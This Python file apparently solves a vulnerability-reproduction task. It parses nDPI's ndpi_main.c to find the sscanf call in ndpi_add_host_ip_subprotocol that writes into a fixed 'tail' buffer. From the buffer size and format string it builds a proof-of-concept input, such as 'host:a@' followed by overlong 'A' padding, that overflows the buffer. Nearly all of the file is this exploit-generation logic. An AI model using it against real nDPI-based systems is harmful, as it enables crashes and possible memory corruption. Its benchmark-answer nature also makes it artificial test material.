import os
import re
import tarfile
from typing import List, Optional, Tuple


def _c_unescape(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c != '\\':
            out.append(c)
            i += 1
            continue
        i += 1
        if i >= n:
            out.append('\\')
            break
        c = s[i]
        i += 1
        if c == 'n':
            out.append('\n')
        elif c == 'r':
            out.append('\r')
        elif c == 't':
            out.append('\t')
        elif c == 'v':
            out.append('\v')
        elif c == 'f':
            out.append('\f')
        elif c == 'a':
            out.append('\a')
        elif c == 'b':
            out.append('\b')
        elif c == '\\':
            out.append('\\')
        elif c == '"':
            out.append('"')
        elif c == "'":
            out.append("'")
        elif c == '0':
            # \0 or \0NNN
            j = i
            val = 0
            cnt = 0
            while j < n and cnt < 3 and s[j] in '01234567':
                val = (val << 3) + (ord(s[j]) - 48)
                j += 1
                cnt += 1
            if cnt > 0:
                i = j
            out.append(chr(val))
        elif c == 'x':
            j = i
            val = 0
            cnt = 0
            while j < n and cnt < 2 and s[j] in '0123456789abcdefABCDEF':
                ch = s[j]
                if '0' <= ch <= '9':
                    v = ord(ch) - 48
                elif 'a' <= ch <= 'f':
                    v = ord(ch) - 87
                else:
                    v = ord(ch) - 55
                val = (val << 4) + v
                j += 1
                cnt += 1
            if cnt > 0:
                i = j
                out.append(chr(val))
            else:
                out.append('x')
        else:
            out.append(c)
    return ''.join(out)


def _read_text_from_tar_or_dir(src_path: str, want_suffix: str) -> Optional[str]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                if fn.endswith(want_suffix) or os.path.join(root, fn).endswith(want_suffix):
                    p = os.path.join(root, fn)
                    try:
                        with open(p, 'rb') as f:
                            return f.read().decode('utf-8', errors='ignore')
                    except OSError:
                        continue
        return None

    try:
        with tarfile.open(src_path, 'r:*') as tf:
            members = tf.getmembers()
            candidates = [m for m in members if m.isfile() and m.name.endswith(want_suffix)]
            if not candidates:
                # try looser match
                candidates = [m for m in members if m.isfile() and os.path.basename(m.name) == os.path.basename(want_suffix)]
            if not candidates:
                return None
            candidates.sort(key=lambda m: len(m.name))
            m = candidates[0]
            f = tf.extractfile(m)
            if f is None:
                return None
            data = f.read()
            return data.decode('utf-8', errors='ignore')
    except tarfile.TarError:
        return None


def _find_define_number(src: str, name: str) -> Optional[int]:
    # Very simple macro resolver: #define NAME <number>
    m = re.search(r'^[ \t]*#[ \t]*define[ \t]+' + re.escape(name) + r'[ \t]+([0-9]+)\b', src, re.M)
    if m:
        try:
            return int(m.group(1))
        except Exception:
            return None
    return None


def _extract_function_block(src: str, func_name: str) -> Optional[str]:
    # Try to match function definition with opening brace
    m = re.search(r'\b' + re.escape(func_name) + r'\b\s*\([^;{]*\)\s*\{', src, re.S)
    if not m:
        # fallback: find first occurrence, then nearest '{'
        pos = src.find(func_name)
        if pos < 0:
            return None
        brace = src.find('{', pos)
        if brace < 0:
            return None
        start = brace
    else:
        start = m.end() - 1  # at '{'

    depth = 0
    i = start
    n = len(src)
    while i < n:
        c = src[i]
        if c == '"':
            # skip strings
            i += 1
            while i < n:
                if src[i] == '\\':
                    i += 2
                    continue
                if src[i] == '"':
                    i += 1
                    break
                i += 1
            continue
        if c == "'":
            i += 1
            while i < n:
                if src[i] == '\\':
                    i += 2
                    continue
                if src[i] == "'":
                    i += 1
                    break
                i += 1
            continue
        if c == '{':
            depth += 1
        elif c == '}':
            depth -= 1
            if depth == 0:
                return src[start:i + 1]
        i += 1
    return None


def _extract_call_substring(src: str, start_pos: int) -> Optional[Tuple[str, int]]:
    # start_pos at 'sscanf' (or within)
    i = src.find('(', start_pos)
    if i < 0:
        return None
    depth = 0
    n = len(src)
    j = i
    while j < n:
        c = src[j]
        if c == '"':
            j += 1
            while j < n:
                if src[j] == '\\':
                    j += 2
                    continue
                if src[j] == '"':
                    j += 1
                    break
                j += 1
            continue
        if c == "'":
            j += 1
            while j < n:
                if src[j] == '\\':
                    j += 2
                    continue
                if src[j] == "'":
                    j += 1
                    break
                j += 1
            continue
        if c == '(':
            depth += 1
        elif c == ')':
            depth -= 1
            if depth == 0:
                return src[start_pos:j + 1], j + 1
        j += 1
    return None


def _parse_c_concatenated_string_literals(s: str, start_quote: int) -> Tuple[str, int]:
    # s[start_quote] == '"'
    i = start_quote
    out = []
    n = len(s)
    while i < n and s[i] == '"':
        i += 1
        buf = []
        while i < n:
            c = s[i]
            if c == '\\':
                if i + 1 < n:
                    buf.append('\\' + s[i + 1])
                    i += 2
                else:
                    buf.append('\\')
                    i += 1
            elif c == '"':
                i += 1
                break
            else:
                buf.append(c)
                i += 1
        out.append(_c_unescape(''.join(buf)))
        while i < n and s[i].isspace():
            i += 1
        if i < n and s[i] == '"':
            continue
        break
    return ''.join(out), i


def _split_top_level_args(argstr: str) -> List[str]:
    args = []
    cur = []
    depth_paren = 0
    depth_brack = 0
    depth_brace = 0
    i = 0
    n = len(argstr)
    while i < n:
        c = argstr[i]
        if c == '"':
            cur.append(c)
            i += 1
            while i < n:
                cur.append(argstr[i])
                if argstr[i] == '\\' and i + 1 < n:
                    i += 2
                    cur.append(argstr[i - 1])
                    continue
                if argstr[i] == '"':
                    i += 1
                    break
                i += 1
            continue
        if c == "'":
            cur.append(c)
            i += 1
            while i < n:
                cur.append(argstr[i])
                if argstr[i] == '\\' and i + 1 < n:
                    i += 2
                    cur.append(argstr[i - 1])
                    continue
                if argstr[i] == "'":
                    i += 1
                    break
                i += 1
            continue
        if c == '(':
            depth_paren += 1
        elif c == ')':
            depth_paren = max(0, depth_paren - 1)
        elif c == '[':
            depth_brack += 1
        elif c == ']':
            depth_brack = max(0, depth_brack - 1)
        elif c == '{':
            depth_brace += 1
        elif c == '}':
            depth_brace = max(0, depth_brace - 1)
        if c == ',' and depth_paren == 0 and depth_brack == 0 and depth_brace == 0:
            a = ''.join(cur).strip()
            if a:
                args.append(a)
            cur = []
            i += 1
            continue
        cur.append(c)
        i += 1
    a = ''.join(cur).strip()
    if a:
        args.append(a)
    return args


def _parse_scanset(scanset: str) -> Tuple[bool, List[Tuple[int, int]], set]:
    # scanset is inside [...], already extracted, not including brackets.
    neg = False
    i = 0
    n = len(scanset)
    if n > 0 and scanset[0] == '^':
        neg = True
        i = 1

    literals = set()
    ranges = []

    def consume_char(pos: int) -> Tuple[Optional[str], int]:
        if pos >= n:
            return None, pos
        c = scanset[pos]
        if c == '\\' and pos + 1 < n:
            return _c_unescape(scanset[pos:pos + 2]), pos + 2
        return c, pos + 1

    while i < n:
        c1, i2 = consume_char(i)
        if c1 is None:
            break
        i = i2
        if i < n and scanset[i] == '-' and i + 1 < n:
            # range
            i += 1
            c2, i2 = consume_char(i)
            if c2 is None:
                literals.add(c1)
                break
            i = i2
            ranges.append((ord(c1), ord(c2)))
        else:
            literals.add(c1)

    norm_ranges = []
    for a, b in ranges:
        if a <= b:
            norm_ranges.append((a, b))
        else:
            norm_ranges.append((b, a))
    return neg, norm_ranges, literals


def _scanset_contains(neg: bool, ranges: List[Tuple[int, int]], literals: set, ch: str) -> bool:
    o = ord(ch)
    in_set = (ch in literals)
    if not in_set:
        for a, b in ranges:
            if a <= o <= b:
                in_set = True
                break
    return (not in_set) if neg else in_set


def _parse_format_specs(fmt: str) -> List[dict]:
    specs = []
    i = 0
    n = len(fmt)
    while i < n:
        c = fmt[i]
        if c != '%':
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == '%':
            i += 2
            continue
        i += 1
        suppressed = False
        if i < n and fmt[i] == '*':
            suppressed = True
            i += 1
        # width
        while i < n and fmt[i].isdigit():
            i += 1
        # length modifiers
        if i < n and fmt[i] in 'hljztLq':
            if i + 1 < n and fmt[i:i + 2] in ('hh', 'll'):
                i += 2
            else:
                i += 1
        if i >= n:
            break
        conv = fmt[i]
        scanset = None
        if conv == '[':
            # parse until matching ]
            i += 1
            start = i
            if i < n and fmt[i] == ']':
                i += 1
            while i < n and fmt[i] != ']':
                if fmt[i] == '\\' and i + 1 < n:
                    i += 2
                else:
                    i += 1
            scanset = fmt[start:i]
            if i < n and fmt[i] == ']':
                i += 1
            specs.append({'suppressed': suppressed, 'conv': '[', 'scanset': scanset})
            continue
        i += 1
        specs.append({'suppressed': suppressed, 'conv': conv, 'scanset': scanset})
    return specs


def _build_input_from_format(fmt: str, tail_spec_non_supp_idx: int, tail_bufsz: int) -> str:
    specs = _parse_format_specs(fmt)
    non_supp_idx = 0

    preferred_chars = ['A', 'a', '0', '1', '.', '/', '_', '-', 'B', 'C', 'x']

    def gen_for_spec(spec: dict, is_tail: bool) -> str:
        conv = spec['conv']
        if conv in 'diuoxX':
            return '0'
        if conv in 'fFeEgGaA':
            return '0'
        if conv == 'p':
            return '0'
        if conv == 'c':
            return 'A'
        if conv == 's':
            return ('A' * (tail_bufsz + 1)) if is_tail else 'A'
        if conv == '[':
            scanset = spec.get('scanset') or ''
            neg, ranges, lits = _parse_scanset(scanset)
            chosen = None
            for ch in preferred_chars:
                if _scanset_contains(neg, ranges, lits, ch):
                    chosen = ch
                    break
            if chosen is None:
                # brute choose ASCII printable
                for o in range(33, 127):
                    ch = chr(o)
                    if _scanset_contains(neg, ranges, lits, ch):
                        chosen = ch
                        break
            if chosen is None:
                chosen = 'A'
            return (chosen * (tail_bufsz + 1)) if is_tail else chosen
        if conv == 'n':
            return ''
        return ('A' * (tail_bufsz + 1)) if is_tail else 'A'

    out = []
    i = 0
    n = len(fmt)
    while i < n:
        c = fmt[i]
        if c == '%':
            if i + 1 < n and fmt[i + 1] == '%':
                out.append('%')
                i += 2
                continue
            i += 1
            suppressed = False
            if i < n and fmt[i] == '*':
                suppressed = True
                i += 1
            while i < n and fmt[i].isdigit():
                i += 1
            if i < n and fmt[i] in 'hljztLq':
                if i + 1 < n and fmt[i:i + 2] in ('hh', 'll'):
                    i += 2
                else:
                    i += 1
            if i >= n:
                break
            conv = fmt[i]
            if conv == '[':
                i += 1
                start = i
                if i < n and fmt[i] == ']':
                    i += 1
                while i < n and fmt[i] != ']':
                    if fmt[i] == '\\' and i + 1 < n:
                        i += 2
                    else:
                        i += 1
                scanset = fmt[start:i]
                if i < n and fmt[i] == ']':
                    i += 1
                spec = {'suppressed': suppressed, 'conv': '[', 'scanset': scanset}
                if not suppressed:
                    is_tail = (non_supp_idx == tail_spec_non_supp_idx)
                    out.append(gen_for_spec(spec, is_tail))
                    non_supp_idx += 1
                continue
            i += 1
            spec = {'suppressed': suppressed, 'conv': conv, 'scanset': None}
            if not suppressed:
                is_tail = (non_supp_idx == tail_spec_non_supp_idx)
                out.append(gen_for_spec(spec, is_tail))
                non_supp_idx += 1
            continue
        if c.isspace():
            # a single space is usually enough
            while i < n and fmt[i].isspace():
                i += 1
            out.append(' ')
            continue
        out.append(c)
        i += 1

    return ''.join(out).lstrip().rstrip()


def _choose_prefix_from_source(src: str) -> Optional[str]:
    # Look for a strncmp/strncasecmp check involving host/ip prefixes near call to ndpi_add_host_ip_subprotocol
    prefixes = []
    for m in re.finditer(r'\bstrn(?:case)?cmp\s*\(\s*[^,]+,\s*"([^"]+)"\s*,\s*([0-9]+)\s*\)', src):
        raw = m.group(1)
        pref = _c_unescape(raw)
        if ('host' in pref.lower()) or ('ip' in pref.lower()):
            snippet = src[m.end():m.end() + 1200]
            if 'ndpi_add_host_ip_subprotocol' in snippet:
                prefixes.append(pref)

    if prefixes:
        # prefer a host prefix
        host_p = [p for p in prefixes if 'host' in p.lower()]
        if host_p:
            host_p.sort(key=lambda x: len(x))
            return host_p[0]
        prefixes.sort(key=lambda x: len(x))
        return prefixes[0]

    # Fallback: if "host:" appears anywhere, try it
    if '"host:"' in src or "'host:'" in src or 'host:' in src:
        return 'host:'
    if re.search(r'"\bhost\b"', src):
        return 'host '
    return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        ndpi_main = _read_text_from_tar_or_dir(src_path, 'ndpi_main.c')
        if not ndpi_main:
            return b'host:a@' + (b'A' * 48)

        func_block = _extract_function_block(ndpi_main, 'ndpi_add_host_ip_subprotocol')
        if not func_block:
            return b'host:a@' + (b'A' * 48)

        tail_size = None
        m = re.search(r'\bchar\s+tail\s*\[\s*([A-Za-z_][A-Za-z0-9_]*|[0-9]+)\s*\]', func_block)
        if m:
            token = m.group(1)
            if token.isdigit():
                tail_size = int(token)
            else:
                tail_size = _find_define_number(ndpi_main, token)

        if not tail_size or tail_size <= 0 or tail_size > 4096:
            tail_size = 32

        # Find sscanf call that mentions tail
        fmt = None
        call_args = None
        for mm in re.finditer(r'\bsscanf\s*\(', func_block):
            call = _extract_call_substring(func_block, mm.start())
            if not call:
                continue
            call_sub = call[0]
            if re.search(r'\btail\b', call_sub):
                # parse args
                lp = call_sub.find('(')
                rp = call_sub.rfind(')')
                if lp < 0 or rp < 0 or rp <= lp:
                    continue
                inside = call_sub[lp + 1:rp]
                args = _split_top_level_args(inside)
                if len(args) < 3:
                    continue
                # second arg should be format
                fmt_arg = args[1].strip()
                q = fmt_arg.find('"')
                if q < 0:
                    continue
                parsed_fmt, _ = _parse_c_concatenated_string_literals(fmt_arg, q)
                fmt = parsed_fmt
                call_args = args
                break

        if not fmt:
            # fallback: assume value is like "a@<tail>"
            prefix = _choose_prefix_from_source(ndpi_main) or 'host:'
            val = 'a@' + ('A' * (tail_size + 1))
            return (prefix + val).encode('ascii', errors='ignore')

        # Determine which format spec corresponds to tail argument
        tail_arg_idx = None
        if call_args and len(call_args) >= 3:
            for idx, a in enumerate(call_args[2:]):
                if re.search(r'(^|[^A-Za-z0-9_])tail([^A-Za-z0-9_]|$)', a):
                    tail_arg_idx = idx
                    break

        specs = _parse_format_specs(fmt)
        non_supp_count = sum(1 for s in specs if not s.get('suppressed'))
        if non_supp_count <= 0:
            prefix = _choose_prefix_from_source(ndpi_main) or 'host:'
            val = 'a@' + ('A' * (tail_size + 1))
            return (prefix + val).encode('ascii', errors='ignore')

        if tail_arg_idx is None or tail_arg_idx < 0 or tail_arg_idx >= non_supp_count:
            tail_spec_idx = non_supp_count - 1
        else:
            tail_spec_idx = tail_arg_idx

        value = _build_input_from_format(fmt, tail_spec_idx, tail_size)

        prefix = _choose_prefix_from_source(ndpi_main)
        if not prefix:
            # hedge with two common variants
            line1 = 'host:' + value
            line2 = 'host ' + value
            return (line1 + '\n' + line2).encode('ascii', errors='ignore')

        return (prefix + value).encode('ascii', errors='ignore')